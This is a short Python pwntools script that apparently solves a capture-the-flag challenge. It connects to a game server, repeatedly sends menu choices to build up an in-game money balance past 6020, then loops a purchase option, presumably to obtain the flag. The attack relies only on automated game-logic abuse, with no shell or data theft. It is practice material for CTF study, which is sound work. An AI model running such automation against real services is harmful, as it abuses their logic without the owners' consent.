from pwn import *
import time

sleeptime = 0.5
recvtimeout = 2

conn = remote("chals20.cybercastors.com", 14432)
try:
	conn.recv(timeout = recvtimeout)
except:
	pass
conn.send("6\n")
time.sleep(sleeptime)
try:
	conn.recv(timeout = recvtimeout)
except:
	pass

while(True):
	conn.send("0\n")
	time.sleep(sleeptime)
	try:
		conn.recv(timeout = recvtimeout)
	except:
		pass
	conn.send("1\n")
	time.sleep(sleeptime)
	recvd = ""
	recvd = str(conn.recv(timeout = recvtimeout))
	print(recvd)
	if(recvd.find("Your money") != -1):
		recvd = recvd[recvd.find("Your money")+12:]
		money = recvd[:recvd.find("n")][:-1]
		print(money)
		if(int(money) > 6020):
			break
	
while(True):
	conn.send("5\n")
	time.sleep(sleeptime)
	print(conn.recv(timeout = recvtimeout))
conn.close()